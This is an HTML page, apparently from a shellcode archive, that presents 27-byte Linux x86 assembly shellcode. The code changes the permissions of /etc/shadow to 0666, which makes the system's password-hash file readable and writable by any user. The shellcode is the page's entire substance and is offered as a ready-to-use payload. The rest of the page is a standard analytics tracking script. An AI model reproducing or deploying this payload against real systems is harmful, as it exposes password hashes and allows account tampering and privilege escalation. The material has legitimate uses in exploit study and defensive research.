<html><head><title>Linux/x86 - chmod 666 /etc/shadow - 27 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
; linux/x86 chmod 666 /etc/shadow 27 bytes
; root@thegibson
; 2010-01-15
 
section .text
        global _start
 
_start:
        ; chmod(&quot;//etc/shadow&quot;, 0666);
        mov al, 15
        cdq
        push edx
        push dword 0x776f6461
        push dword 0x68732f63
        push dword 0x74652f2f
        mov ebx, esp
        mov cx, 0666o
        int 0x80

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
